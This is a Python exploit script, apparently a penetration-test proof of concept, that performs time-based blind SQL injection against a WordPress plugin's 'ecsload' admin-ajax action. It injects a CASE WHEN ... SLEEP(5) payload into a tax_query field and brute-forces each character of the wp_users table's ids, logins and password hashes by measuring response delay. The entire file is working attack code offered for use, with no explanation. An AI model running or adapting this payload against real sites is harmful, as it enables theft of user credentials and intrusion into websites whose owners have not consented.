import sys
import requests
import string
import time
import termios
from multiprocessing import Pool
config = {

	"proxies":{
		'http':'http://127.0.0.1:8080',
		'https':'http://127.0.0.1:8080'
	},

	"data": {
		"action":"ecsload",
		"query": "",
		"ecs_ajax_settings": """{"post_id":"1", "current_page":1, "widget_id":1, "theme_id":1, "max_num_pages":10}"""
	}
}

url = "http://localhost/pentest/wp-admin/admin-ajax.php"
query = """{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN (select SUBSTRING((select Group_CONCAT(id,':',user_login,':',user_pass,',') from wp_users),%d,1) COLLATE utf8mb4_bin = '%s' ) THEN SLEEP(5) ELSE 2070 END )"]}}}"""
data = config['data']
list = []
for i in range (1,46):
    proxies = None
    chars = string.ascii_letters + string.digits + string.punctuation
    for c in chars:
        tmp = query % (i,c)
        data['query'] = tmp

        start = time.time()
        r = requests.post(url, data=data, verify=False, proxies=proxies)
        end = time.time()
        if r.status_code == 500 and (end-start)>= 5.0:
            x= end-start
            list.append(c)
print(list)
        


            

            

        
    
    





